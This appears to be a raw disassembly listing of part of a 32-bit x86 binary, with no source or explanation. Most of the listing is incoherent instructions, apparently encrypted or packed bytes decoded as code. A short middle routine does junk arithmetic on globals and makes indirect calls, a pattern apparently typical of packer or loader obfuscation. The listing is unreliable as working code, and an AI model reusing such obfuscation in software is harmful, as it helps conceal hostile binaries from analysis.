  41e5ee:	pop    ebp
  41e5ef:	mov    ss,WORD PTR [edi]
  41e5f1:	add    cl,ah
  41e5f3:	ins    DWORD PTR es:[edi],dx
  41e5f4:	inc    edx
  41e5f5:	mov    eax,?
  41e5f7:	and    DWORD PTR [ebp-0x33],eax
  41e5fa:	int    0x8f
  41e5fc:	jl     0x41e667
  41e5fe:	ret    
  41e5ff:	(bad)  
  41e600:	aam    0x7
  41e602:	in     al,0xc6
  41e604:	cmp    eax,0xa57c46e3
  41e609:	sysret 
  41e60b:	jecxz  0x41e667
  41e60d:	xor    al,0x6e
  41e60f:	repz mov esi,0x1422dcaa
  41e615:	ja     0x41e602
  41e617:	stc    
  41e618:	fs das 
  41e61a:	loope  0x41e632
  41e61c:	fnstcw WORD PTR [esi+0x4f11aa75]
  41e622:	aam    0xab
  41e624:	push   esp
  41e625:	gs sbb bl,dl
  41e628:	push   0xffffff96
  41e62a:	inc    edi
  41e62b:	mul    BYTE PTR [edx+0x3eeb4518]
  41e631:	inc    edi
  41e632:	imul   ebp,DWORD PTR [edx+0x78],0xeb83fff1
  41e639:	shl    al,1
  41e63b:	xor    DWORD PTR [ecx+0xf],esi
  41e63e:	mov    esp,0x97416e4d
  41e643:	daa    
  41e644:	and    bh,bh
  41e646:	out    0xa9,al
  41e648:	cmp    bl,BYTE PTR [ebx-0x76b485de]
  41e64e:	sahf   
  41e64f:	jecxz  0x41e5e2
  41e651:	cmp    esp,DWORD PTR [esi+0x11b9a8c]
  41e657:	scas   eax,DWORD PTR es:[edi]
  41e658:	std    
  41e659:	fwait
  41e65a:	xchg   esi,eax
  41e65b:	pop    ecx
  41e65c:	shr    DWORD PTR [edi-0x1cf369c5],0xba
  41e663:	add    eax,0xcc251ce9
  41e668:	lahf   
  41e669:	mov    ch,0xbe
  41e66b:	add    al,0x3a
  41e66d:	pop    ecx
  41e66e:	mov    cl,0xc7
  41e670:	jp     0x41e694
  41e672:	mov    ch,0xb8
  41e674:	lods   eax,DWORD PTR ds:[esi]
  41e675:	mov    bl,BYTE PTR [ebx]
  41e677:	add    dh,BYTE PTR [eax]
  41e679:	fldcw  WORD PTR [ebp+eiz*1+0x4d410205]
  41e680:	push   eax
  41e681:	xchg   DWORD PTR [eax],edx
  41e683:	lahf   
  41e684:	js     0x41e6f2
  41e686:	mov    al,ds:0x7cf16c06
  41e68b:	adc    bp,WORD PTR [edi]
  41e68e:	mov    al,0x7c
  41e690:	je     0x41e6e6
  41e692:	test   esi,edx
  41e694:	repz retf 0xbff4
  41e698:	call   0x48efecb0
  41e69d:	retf   
  41e69e:	jo     0x41e6b5
  41e6a0:	pop    ds
  41e6a1:	jmp    0x1ef9:0x5943ee97
  41e6a8:	stos   DWORD PTR es:[edi],eax
  41e6a9:	mov    dl,0x44
  41e6ab:	add    edx,esi
  41e6ad:	xchg   DWORD PTR [ebp-0x61],ebx
  41e6b0:	push   0x39a55baf
  41e6b5:	sbb    DWORD PTR [ecx+ebx*2-0xee55ac],edi
  41e6bc:	(bad)  
  41e6bd:	scas   al,BYTE PTR es:[edi]
  41e6be:	mov    edi,0xf7cc06dc
  41e6c3:	(bad)  
  41e6c5:	div    DWORD PTR [edi-0xa]
  41e6c8:	stos   DWORD PTR es:[edi],eax
  41e6c9:	std    
  41e6ca:	or     esp,esp
  41e6cc:	xchg   esi,eax
  41e6cd:	pop    ecx
  41e6ce:	mov    dl,BYTE PTR [esi-0x4729d86c]
  41e6d4:	xchg   ecx,eax
  41e6d5:	int3   
  41e6d6:	add    BYTE PTR [eax-0x54],dh
  41e6d9:	or     al,0x8f
  41e6db:	mov    al,ds:0x39acaa67
  41e6e0:	inc    edx
  41e6e1:	rcl    BYTE PTR [edi-0x14],cl
  41e6e4:	out    dx,eax
  41e6e5:	mov    dl,0xbc
  41e6e7:	mov    BYTE PTR [esi+0x7c6a1701],ch
  41e6ed:	dec    esi
  41e6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6ef:	cld    
  41e6f0:	xchg   al,ch
  41e6f2:	xor    al,cl
  41e6f4:	sbb    DWORD PTR [ebx+0x19a5faaa],edi
  41e6fa:	xor    ah,BYTE PTR [edx+0xb3ac751]
  41e700:	fxch   st(6)
  41e702:	pop    esi
  41e703:	(bad)  
  41e704:	fs xchg ebx,eax
  41e706:	xchg   esp,eax
  41e707:	loopne 0x41e6fd
  41e709:	sub    al,0x7b
  41e70b:	jmp    0xf35a:0x67c31105
  41e712:	jb     0x41e6a8
  41e714:	call   0xff4edfc3
  41e719:	jae    0x41e770
  41e71b:	sbb    dh,ah
  41e71d:	scas   al,BYTE PTR es:[edi]
  41e71e:	(bad)  
  41e71f:	push   ds
  41e720:	popf   
  41e721:	pop    esp
  41e722:	cmp    DWORD PTR [esp+ebx*8],ebp
  41e725:	push   edi
  41e726:	jno    0x41e75f
  41e728:	or     eax,0xf301f241
  41e72d:	dec    esp
  41e72e:	inc    eax
  41e72f:	dec    edi
  41e730:	ret    
  41e731:	inc    edi
  41e732:	mov    edi,0xda6118b5
  41e737:	pop    edi
  41e738:	icebp  
  41e739:	or     cl,cl
  41e73b:	xchg   ebp,eax
  41e73c:	arpl   WORD PTR [eax+0x6422a1d],si
  41e742:	sub    BYTE PTR [edi+0x65],ch
  41e745:	cmp    al,0x63
  41e747:	inc    esp
  41e748:	dec    edi
  41e749:	das    
  41e74a:	mov    BYTE PTR [ebx],0xda
  41e74d:	pop    esi
  41e74e:	sbb    dh,ch
  41e750:	loop   0x41e744
  41e752:	mov    ebp,0x8235b6d3
  41e757:	aad    0xa5
  41e759:	icebp  
  41e75a:	fadd   DWORD PTR [edx-0x7c]
  41e75d:	jnp    0x41e6f2
  41e75f:	sbb    edi,DWORD PTR [edi+0x5cf9cd34]
  41e765:	mov    edi,0xd49c3674
  41e76a:	enter  0x5567,0x44
  41e76e:	je     0x41e7e5
  41e770:	mov    eax,ebx
  41e772:	fst    DWORD PTR [edx]
  41e774:	adc    esi,edx
  41e776:	out    0x15,al
  41e778:	ss aam 0x36
  41e77b:	push   esp
  41e77c:	adc    BYTE PTR [esi-0x5b],dh
  41e77f:	jns    0x41e778
  41e781:	push   0xb05aed34
  41e786:	into   
  41e787:	rcl    BYTE PTR [eax+eiz*4+0x1f7209e9],1
  41e78e:	xchg   BYTE PTR [eax-0x42],dh
  41e791:	inc    BYTE PTR [eax]
  41e793:	add    DWORD PTR [ebx],ebp
  41e795:	cmp    BYTE PTR [eax],dl
  41e797:	dec    esi
  41e798:	jae    0x41e762
  41e79a:	push   ebp
  41e79b:	call   0x320b4c98
  41e7a0:	cdq    
  41e7a1:	push   ebp
  41e7a2:	fisub  WORD PTR [edi]
  41e7a4:	cmp    esi,0x78
  41e7a7:	cli    
  41e7a8:	popf   
  41e7a9:	clc    
  41e7aa:	sbb    DWORD PTR [ebp-0x29e75cfb],ebp
  41e7b0:	loop   0x41e796
  41e7b2:	popf   
  41e7b3:	ret    0x8ac8
  41e7b6:	jl     0x41e803
  41e7b8:	pop    ebx
  41e7b9:	(bad)  
  41e7ba:	pop    ecx
  41e7bb:	loope  0x41e7f0
  41e7bd:	pop    esp
  41e7be:	or     ebp,DWORD PTR [ebx+0x768e2119]
  41e7c4:	xor    eax,0x4be0e9
  41e7c9:	and    esp,esp
  41e7cb:	aaa    
  41e7cc:	and    ecx,DWORD PTR [esp+ebx*1]
  41e7cf:	pop    ecx
  41e7d0:	lods   al,BYTE PTR ds:[esi]
  41e7d1:	inc    edi
  41e7d2:	(bad)  
  41e7d3:	pop    esp
  41e7d4:	adc    cl,BYTE PTR [ecx]
  41e7d6:	adc    DWORD PTR [ecx+esi*2],ecx
  41e7d9:	shr    DWORD PTR [ebx],0x99
  41e7dc:	or     ah,BYTE PTR [ebx]
  41e7de:	xchg   edi,eax
  41e7df:	or     ebp,DWORD PTR [edx]
  41e7e1:	loopne 0x41e857
  41e7e3:	sub    al,0x31
  41e7e5:	scas   eax,DWORD PTR es:[edi]
  41e7e6:	adc    dh,ch
  41e7e8:	aaa    
  41e7e9:	test   eax,0x8e0ffbf2
  41e7ee:	adc    eax,0xabc7868e
  41e7f3:	pop    edi
  41e7f4:	fcomp  st(4)
  41e7f6:	in     al,dx
  41e7f7:	xchg   esi,eax
  41e7f8:	(bad)  
  41e7f9:	stos   DWORD PTR es:[edi],eax
  41e7fa:	push   ss
  41e7fb:	dec    edx
  41e7fc:	iret   
  41e7fd:	mov    dh,BYTE PTR [eax+0x7c034221]
  41e803:	xor    BYTE PTR [ebp-0x80],bh
  41e806:	cmp    edi,DWORD PTR [ebx-0x33718659]
  41e80c:	loopne 0x41e801
  41e80e:	stos   BYTE PTR es:[edi],al
  41e80f:	lea    esi,[ecx+0x41cbb3e4]
  41e815:	xor    BYTE PTR [eax+0x400bb219],dl
  41e81b:	mov    esi,0x7b7685c9
  41e820:	jmp    0x41e867
  41e822:	pusha  
  41e823:	pop    ecx
  41e824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e825:	xor    eax,0x6ba21785
  41e82a:	int    0x65
  41e82c:	and    eax,0xaaae6878
  41e831:	call   0x863e535
  41e836:	cmp    ebx,DWORD PTR [edx-0x57]
  41e839:	icebp  
  41e83a:	stc    
  41e83b:	dec    ecx
  41e83c:	out    dx,eax
  41e83d:	inc    ecx
  41e83e:	push   ecx
  41e83f:	mov    dh,0xfc
  41e841:	inc    edx
  41e842:	push   ebp
  41e843:	es dec eax
  41e845:	pop    ebp
  41e846:	out    0x94,al
  41e848:	xchg   ebp,eax
  41e849:	pop    esi
  41e84a:	xor    al,0x66
  41e84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e84d:	dec    ebx
  41e84e:	mov    esp,0xccae1439
  41e853:	sub    ah,ah
  41e855:	ret    0x4f83
  41e858:	cmp    al,0x44
  41e85a:	jns    0x41e841
  41e85c:	cmp    eax,DWORD PTR [edi-0x3e]
  41e85f:	sbb    edx,DWORD PTR [esi-0x9d961f6]
  41e865:	mov    edi,0x573606a8
  41e86a:	dec    esp
  41e86b:	inc    esi
  41e86c:	mov    ds:0xaa060498,eax
  41e871:	xchg   esi,eax
  41e872:	imul   eax,DWORD PTR [esi],0x56
  41e875:	pop    esi
  41e876:	inc    eax
  41e877:	icebp  
  41e878:	ds ret 
  41e87a:	rol    BYTE PTR [edi-0x81098d2],cl
  41e880:	xlat   BYTE PTR ds:[ebx]
  41e881:	sbb    DWORD PTR [ebp+0x7c],esp
  41e884:	mov    gs:0x50ee6771,al
  41e88a:	mov    edx,0x3a553f2d
  41e88f:	out    0x76,eax
  41e891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e892:	jbe    0x41e8dd
  41e894:	xchg   esi,eax
  41e895:	xor    al,0x8a
  41e897:	or     al,0x5b
  41e899:	out    dx,eax
  41e89a:	xchg   edx,eax
  41e89b:	mov    ah,0xd0
  41e89d:	add    eax,0x2a688387
  41e8a2:	mov    ah,dh
  41e8a4:	aaa    
  41e8a5:	icebp  
  41e8a6:	call   0x6eba:0xb223f9b3
  41e8ad:	mov    esi,0x5429b118
  41e8b2:	(bad)  
  41e8b3:	out    dx,eax
  41e8b4:	fdivr  st,st(3)
  41e8b6:	mov    edx,0x3cdf5f6e
  41e8bb:	in     eax,dx
  41e8bc:	fstp   st(3)
  41e8be:	outs   dx,BYTE PTR ds:[esi]
  41e8bf:	xor    BYTE PTR [ecx-0x35],dh
  41e8c2:	mov    ah,0xd0
  41e8c4:	into   
  41e8c5:	nop
  41e8c6:	add    BYTE PTR [ecx-0x61],bl
  41e8c9:	add    al,0xab
  41e8cb:	or     eax,0x7665e3e9
  41e8d0:	ret    0xba51
  41e8d3:	lods   al,BYTE PTR ds:[esi]
  41e8d4:	pushf  
  41e8d5:	xor    ecx,DWORD PTR [edx]
  41e8d7:	lods   al,BYTE PTR ds:[esi]
  41e8d8:	ja     0x41e942
  41e8da:	jmp    0xa8fdfe6d
  41e8df:	in     al,0xd0
  41e8e1:	mov    bh,0xa6
  41e8e3:	fnstcw WORD PTR [ebx-0x4c]
  41e8e6:	int    0x1d
  41e8e8:	sub    dh,dl
  41e8ea:	jae    0x41e96b
  41e8ec:	sub    al,0x63
  41e8ee:	popa   
  41e8ef:	add    ch,bl
  41e8f1:	fs scas eax,DWORD PTR es:[edi]
  41e8f3:	or     eax,0x9fda3bdf
  41e8f8:	or     al,0x68
  41e8fa:	dec    esi
  41e8fb:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e8fd:	and    DWORD PTR [ecx+0x6],esp
  41e900:	cmc    
  41e901:	jae    0x41e8b8
  41e903:	in     al,0xbc
  41e905:	jne    0x41e8d6
  41e907:	mov    cl,0xda
  41e909:	aaa    
  41e90a:	pop    es
  41e90b:	mov    bh,0x81
  41e90d:	cmc    
  41e90e:	sti    
  41e90f:	and    DWORD PTR [esi-0x13],ebx
  41e912:	icebp  
  41e913:	cdq    
  41e914:	es or  eax,0x3c57e3ee
  41e91a:	(bad)  
  41e91c:	push   0xffffffda
  41e91e:	inc    edi
  41e91f:	xor    al,0xe3
  41e921:	dec    esp
  41e922:	sbb    bl,BYTE PTR [ecx+0x182fc901]
  41e928:	pusha  
  41e929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e92a:	cmc    
  41e92b:	cmc    
  41e92c:	mov    bl,0x57
  41e92e:	retf   0x6286
  41e931:	xchg   ebp,eax
  41e932:	jns    0x41e8d6
  41e934:	cmp    DWORD PTR [eax+0x51],eax
  41e937:	lods   eax,DWORD PTR ds:[esi]
  41e938:	es sbb ah,ch
  41e93b:	icebp  
  41e93c:	push   es
  41e93d:	data16 jnp 0x41e8c3
  41e940:	pop    ecx
  41e941:	in     al,0x8
  41e943:	retf   0xfc5b
  41e946:	push   cs
  41e947:	sbb    ecx,edx
  41e949:	mov    bh,0x4b
  41e94b:	lods   al,BYTE PTR ds:[esi]
  41e94c:	xchg   ebx,eax
  41e94d:	lds    esi,FWORD PTR [ebp+0x66]
  41e950:	retf   
  41e951:	scas   eax,DWORD PTR es:[edi]
  41e952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e953:	or     ah,BYTE PTR [ebx+esi*4]
  41e956:	ins    DWORD PTR es:[edi],dx
  41e957:	popf   
  41e958:	icebp  
  41e959:	adc    ebp,DWORD PTR [edx+0x7d621407]
  41e95f:	mov    esi,0xaba61b20
  41e964:	xchg   esi,eax
  41e965:	xor    eax,0x8976c3d9
  41e96a:	mov    eax,ds:0xd3a9f42b
  41e96f:	push   ebx
  41e970:	(bad)  
  41e971:	jmp    0x41e907
  41e973:	stos   BYTE PTR es:[edi],al
  41e974:	out    dx,eax
  41e975:	dec    ebp
  41e976:	int    0x2b
  41e978:	jg     0x41e988
  41e97a:	jg     0x41e9ae
  41e97c:	stc    
  41e97d:	adc    BYTE PTR [edx+0x7a1a582],ah
  41e983:	or     edx,edi
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422608
  41e9a9:	push   DWORD PTR ds:0x42239c
  41e9af:	mov    eax,ds:0x422518
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422518
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422518
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428227,0x0
  41ea0c:	mov    DWORD PTR ds:0x428333,0x7749
  41ea16:	mov    DWORD PTR ds:0x428133,ebx
  41ea1c:	mov    DWORD PTR ds:0x4282d3,edx
  41ea22:	mov    DWORD PTR ds:0x4282d3,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42824b,edx
  41ea37:	cmp    DWORD PTR ds:0x428227,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428dd4
  41ea54:	sbb    DWORD PTR ds:0x42832f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x4282db
  41ea60:	xor    ecx,DWORD PTR ds:0x4282c7
  41ea66:	mov    DWORD PTR ds:0x4282db,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428203,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428157
  41ea80:	mov    ecx,DWORD PTR ds:0x4281a3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428147,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281b7
  41ea95:	mov    eax,ds:0x4282a3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42821b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42824b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x4282db,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428357,0x4282af
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428343,0x428353
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x4282c3
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42821b,0x42814f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x428367,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb42:	mov    DWORD PTR ds:0x428357,edx
  41eb48:	mov    DWORD PTR ds:0x4281f7,ebx
  41eb4e:	not    DWORD PTR ds:0x4281f3
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x4281eb,0x3ca0
  41eb63:	not    DWORD PTR ds:0x4282d7
  41eb69:	cmp    DWORD PTR ds:0x4282e7,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428dd8
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42834f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428357,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x4281ef
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428283
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428353,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42811b,0x428267
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42820f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x71
  41ec04:	sub    eax,0x2f0e6a37
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx+0x1e181812],ah
  41ec10:	mov    edx,DWORD PTR [edx+0x2305bc26]
  41ec16:	jle    0x41ec8d
  41ec18:	in     al,0xcb
  41ec1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec1b:	je     0x41ebad
  41ec1d:	sti    
  41ec1e:	push   0xffffffed
  41ec20:	push   esp
  41ec21:	and    BYTE PTR [ebp+0x73],0xdf
  41ec25:	out    dx,eax
  41ec26:	push   ss
  41ec27:	add    edi,DWORD PTR [esi]
  41ec29:	jle    0x41ec7e
  41ec2b:	out    0x78,al
  41ec2d:	and    esp,DWORD PTR [ebx+ebx*4+0x15441527]
  41ec34:	scas   eax,DWORD PTR es:[edi]
  41ec35:	ins    DWORD PTR es:[edi],dx
  41ec36:	daa    
  41ec37:	jbe    0x41ec60
  41ec39:	adc    ebx,DWORD PTR ds:0x64038515
  41ec3f:	and    ebp,eax
  41ec41:	push   ecx
  41ec42:	cs and dl,ah
  41ec45:	ins    DWORD PTR es:[edi],dx
  41ec46:	pop    ds
  41ec47:	into   
  41ec48:	sahf   
  41ec49:	push   ebp
  41ec4a:	xor    edi,ebp
  41ec4c:	inc    edi
  41ec4d:	cmp    eax,0x7efd8a68
  41ec52:	sbb    ch,ah
  41ec54:	mov    BYTE PTR [ebx],cl
  41ec56:	es cli 
  41ec58:	ja     0x41ec12
  41ec5a:	sbb    edi,edx
  41ec5c:	cmp    ah,ch
  41ec5e:	shl    BYTE PTR fs:[ebx],0x98
  41ec62:	dec    ebp
  41ec63:	xor    esp,DWORD PTR [ecx-0x539d7f34]
  41ec69:	fsubr  st,st(3)
  41ec6b:	f2xm1  
  41ec6d:	xor    dl,BYTE PTR [esi]
  41ec6f:	sahf   
  41ec70:	lods   al,BYTE PTR ds:[esi]
  41ec71:	imul   eax,DWORD PTR [ecx],0xe71825b1
  41ec77:	mov    WORD PTR [eax+ecx*4+0x6d140298],?
  41ec7e:	mov    esi,0x189d7696
  41ec83:	jmp    0x92e8908f
  41ec88:	mov    ch,BYTE PTR [ebp+0x57c967e2]
  41ec8e:	pop    esp
  41ec8f:	aaa    
  41ec90:	push   ecx
  41ec91:	call   0xbffb:0xbbe2e45c
  41ec98:	cmp    al,0x32
  41ec9a:	push   esi
  41ec9b:	xor    BYTE PTR [ebx+0x10],0xaf
  41ec9f:	data16 or cl,BYTE PTR [eax+0x496535ee]
  41eca6:	and    cl,BYTE PTR [eax-0x6b07273d]
  41ecac:	cwde   
  41ecad:	inc    ebx
  41ecae:	and    ebx,DWORD PTR [eax-0x376c105b]
  41ecb4:	push   ss
  41ecb5:	cmp    BYTE PTR [edx-0x9],bh
  41ecb8:	popa   
  41ecb9:	aad    0x90
  41ecbb:	dec    esp
  41ecbc:	jne    0x41ecd2
  41ecbe:	lods   eax,DWORD PTR ds:[esi]
  41ecbf:	push   eax
  41ecc0:	popa   
  41ecc1:	cdq    
  41ecc2:	mov    bl,0x38
  41ecc4:	pop    edi
  41ecc5:	inc    edx
  41ecc6:	scas   eax,DWORD PTR es:[edi]
  41ecc7:	push   ds
  41ecc8:	inc    ebp
  41ecc9:	push   ss
  41ecca:	cwde   
  41eccb:	sub    al,cl
  41eccd:	jo     0x41ecbf
  41eccf:	push   0xffffffa5
  41ecd1:	xchg   dh,dh
  41ecd3:	fsubr  st(2),st
  41ecd5:	xor    eax,0xcb2206b1
  41ecda:	fs ins BYTE PTR es:[edi],dx
  41ecdc:	jnp    0x41ed1a
  41ecde:	inc    ebp
  41ecdf:	adc    al,0x5f
  41ece1:	retf   
  41ece2:	mov    esp,0x6445f11d
  41ece7:	mov    eax,ds:0xda075cbb
  41ecec:	sub    bl,BYTE PTR es:[edi+0x212e56a0]
  41ecf3:	cld    
  41ecf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecf5:	cmp    al,0xc8
  41ecf7:	cmp    eax,0xc61465c4
  41ecfc:	push   cs
  41ecfd:	push   ebx
  41ecfe:	or     DWORD PTR fs:[ebx+0x65253ea],ebp
  41ed05:	call   0xb48d9297
  41ed0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed0b:	pop    ss
  41ed0c:	int3   
  41ed0d:	lock mov edx,0xbd1e55c7
  41ed13:	or     al,0x64
  41ed15:	into   
  41ed16:	ret    
  41ed17:	(bad)  
  41ed18:	not    BYTE PTR [ebx]
  41ed1a:	out    dx,eax
  41ed1b:	lock loope 0x41ecae
  41ed1e:	sbb    BYTE PTR ds:0x3f534e04,0xff
  41ed25:	test   al,0xde
  41ed27:	jbe    0x41eda7
  41ed29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed2a:	sbb    dl,BYTE PTR [ebp-0x25]
  41ed2d:	loope  0x41ed4a
  41ed2f:	shl    eax,0xf9
  41ed32:	hlt    
  41ed33:	retf   0xf2d5
  41ed36:	sahf   
  41ed37:	adc    al,dh
  41ed39:	lock ja 0x41ecea
  41ed3c:	xchg   DWORD PTR [esi-0x75437341],ebx
  41ed42:	dec    eax
  41ed43:	inc    ebx
  41ed44:	lahf   
  41ed45:	ja     0x41ed7a
  41ed47:	data16 sbb al,0x43
  41ed4a:	mov    esp,0x702ca065
  41ed4f:	es popf 
  41ed51:	fcmovb st,st(7)
  41ed53:	pop    ss
  41ed54:	lods   eax,DWORD PTR ds:[esi]
  41ed55:	out    dx,al
  41ed56:	xor    BYTE PTR [edx],dl
  41ed58:	mov    esi,0xc11a06bd
  41ed5d:	outs   dx,BYTE PTR ds:[esi]
  41ed5e:	aad    0x47
  41ed60:	or     BYTE PTR [esi-0x6e],dh
  41ed63:	pusha  
  41ed64:	test   BYTE PTR [ecx],bl
  41ed66:	div    BYTE PTR [edx+eax*1+0x61bbe56b]
  41ed6d:	pop    ebx
  41ed6e:	xchg   ecx,eax
  41ed6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed70:	popf   
  41ed71:	cmp    esp,ebp
  41ed73:	mov    ebp,0x696d8e06
  41ed78:	aad    0x1
  41ed7a:	and    bh,BYTE PTR [ebp-0x41]
  41ed7d:	sub    bl,BYTE PTR [edx+0x40]
  41ed80:	mov    edx,0xf39cbbb5
  41ed85:	mov    bl,0xa1
  41ed87:	(bad)  
  41ed88:	mov    dl,0xd4
  41ed8a:	add    al,0xce
  41ed8c:	inc    edi
  41ed8d:	enter  0x663f,0xc8
  41ed91:	jne    0x41ee0b
  41ed93:	div    BYTE PTR [edx-0x71ba4833]
  41ed99:	jmp    0x41ed7c
  41ed9b:	add    bh,BYTE PTR [edi-0x60f26151]
  41eda1:	fst    QWORD PTR [ebp-0x14]
  41eda4:	mov    ebp,0xba1314b5
  41eda9:	js     0x41ee2a
  41edab:	iret   
  41edac:	out    0xa8,eax
  41edae:	xchg   esi,eax
  41edaf:	int    0xce
  41edb1:	call   0x3ca4cef7
  41edb6:	jmp    0xb497156
  41edbb:	and    esi,esi
  41edbd:	ret    
  41edbe:	sbb    ah,0x44
  41edc1:	adc    al,0x87
  41edc3:	adc    dl,BYTE PTR [ecx+eax*1+0x2132c407]
  41edca:	or     al,BYTE PTR [ecx+eax*8]
  41edcd:	xchg   ecx,eax
  41edce:	(bad)
  41edd2:	add    eax,0xf928f3aa
  41edd7:	data16 repz sub ah,al
  41eddb:	mov    esp,0x4d293781
  41ede0:	arpl   cx,di
  41ede2:	or     ebp,DWORD PTR [edx+0x6e]
  41ede5:	add    al,0x65
  41ede7:	dec    eax
  41ede8:	nop
  41ede9:	int    0x7b
  41edeb:	xchg   esi,eax
  41edec:	sti    
  41eded:	jg     0x41ed7a
  41edef:	xor    ah,dh
  41edf1:	adc    bh,BYTE PTR [eax-0x6a93afd8]
  41edf7:	cli    
  41edf8:	jbe    0x41ed93
  41edfa:	jb     0x41edad
  41edfc:	shr    DWORD PTR [edi+0x68],cl
  41edff:	jo     0x41ee16
  41ee01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee02:	or     al,0x3a
  41ee04:	idiv   BYTE PTR [eax+0x702c37c4]
  41ee0a:	push   es
  41ee0b:	pop    ebp
  41ee0c:	lds    edx,FWORD PTR [ecx-0xb]
  41ee0f:	rol    DWORD PTR [edx+eiz*1+0x6aec2a62],0xce
  41ee17:	(bad)  
  41ee18:	ror    DWORD PTR [bp-0x2a58],1
  41ee1d:	push   ecx
  41ee1e:	push   ebp
  41ee1f:	fadd   DWORD PTR [edi+0x31]
  41ee22:	xchg   esp,eax
  41ee23:	sub    esi,DWORD PTR [esi-0x5ad795cd]
  41ee29:	pop    ebx
